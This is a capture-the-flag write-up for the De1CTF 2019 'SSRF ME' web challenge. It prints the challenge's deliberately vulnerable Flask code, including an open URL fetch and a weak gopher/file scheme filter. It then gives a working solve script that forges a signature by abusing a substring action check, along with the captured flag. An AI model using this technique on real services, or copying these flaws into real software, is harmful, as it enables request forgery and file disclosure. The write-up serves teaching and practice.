---
title: "SSRF ME - De1CTF 2019"
date: 2019-08-06T22:59:36+02:00
tags:
    - "CTF"
    - "De1CTF"
    - "Web"
    - "SSRf"
draft: true
---

### Description
> SSRF ME TO GET FLAG.

> http://139.180.128.86

For this challenge we are provided with a url that returns the following python
code:
```python
#!/usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding('latin1')

app = Flask(__name__)

secert_key = os.urandom(16)


class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False


#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)


@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route('/')
def index():
    return open("code.txt","r").read()


def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"



def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()


def md5(content):
    return hashlib.md5(content).hexdigest()


def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False


if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0',port=80)
```

It's the code from the Flask app that is running on the website.

Basically it's a simple web app that allows us to do two things by using the
`action` parameter:

* scan: writes the content of a file located on the server in a file called
`result.txt`

* read: returns the content of the `result.txt` file

The `scan` and `read` actions are invoked by making a request to the `/De1ta`
endpoint.


The problem is that we need to provide a cookie called `sign` that is
remotely checked and must be in this format:
```
md5(secret_key + param + action)
```
`param` is used in conjuction with the `scan` action to indicate which file to
read.

We can see at the beginning of the python script that the `secret_key` is
generated using `os.urandom(16)`, so there's no way to bruteforce it.

Let's analyze the `/geneSign` endpoint.
It allows us to generate a signature using 'scan' as action:
```
md5(secret_key + param + 'scan')
```

The vulnerability in this application is located in the `Exec` function.
Instead of checking if the passed action is equal to `scan` or `read`, it
checks if the action contains `scan` and `read`.
We can exploit this by making a request to `geneSign` with 'flag.txtread' as
`param`, so that the following signature is generated:

```
secret_key + 'flag.txtread' + 'scan'
```
and then use the signature with `scan` and `read` actions to read the flag.
Here's the python code to do that:

```python
#!/usr/bin/env python3
import requests
import urllib

def getSign(param, action):
    params = {'param': param}
    cookies =  {'action': action}
    r = requests.get("http://192.168.43.204:8080/geneSign", params=params, cookies=cookies)
    return r.text.strip().replace('\n', '')

action = 'readscan'
sign = getSign('flag.txtread', '')

params = {'param': 'flag.txt'}
cookies = {'sign': sign, 'action': action}

r = requests.get("http://192.168.43.204:8080/De1ta", params=params, cookies=cookies)
print(r.text)
```

Let's run it:
```
$ ./solve.py
{"code": 200, "data": "de1ctf{27782fcffbb7d00309a93bc49b74ca26}\n"}
```

### Flag
```
de1ctf{27782fcffbb7d00309a93bc49b74ca26}
```
